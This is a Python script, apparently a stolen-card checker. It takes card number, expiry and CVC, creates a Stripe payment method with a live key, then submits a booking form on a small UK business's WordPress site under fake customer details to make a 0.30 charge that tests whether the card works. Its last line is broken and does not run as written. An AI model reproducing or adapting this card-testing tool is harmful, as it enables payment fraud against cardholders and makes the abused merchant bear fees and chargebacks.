import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F2531af6ecf%3B+stripe-js-v3%2F2531af6ecf%3B+card-element&key=pk_live_51IptajIBfeWZuJE2AqWgwMoDW9qJ6KV92UmIdF9m6JFXJRcBYCNLmRg8EM299D8yhxobs01h0RfvYB798Nj2aXzz00F75jRU3D'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'www.firstembracebirthandbaby.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.firstembracebirthandbaby.co.uk',
	    'referer': 'https://www.firstembracebirthandbaby.co.uk/make-a-booking/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1746791741718',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=1338&_fluentform_4_fluentformnonce=cc34e1d25c&_wp_http_referer=%2Fmake-a-booking%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=%2B66817480671&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&input_radio_5=Baby%20Massage%20and%20Yoga%20Gift%20Voucher%20%20&names_1%5Bfirst_name%5D=&names_1%5Blast_name%5D=&input_text=&datetime=&names_2%5Bfirst_name%5D=Rodam&names_2%5Blast_name%5D=User&input_text_1=Bro&phone_1=%2B66817480671&description_2=N&description_3=N&input_radio_4=no&terms-n-condition=on&terms-n-condition_1=on&terms-n-condition_2=on&payment_method=stripe&custom_payment_component_a0xb5f_1=0.30&datetime_1=&__ff_all_applied_coupons=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	response = requests.post(
	    'https://www.firstembracebirthandbaby.co.uk/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
	return (response.)
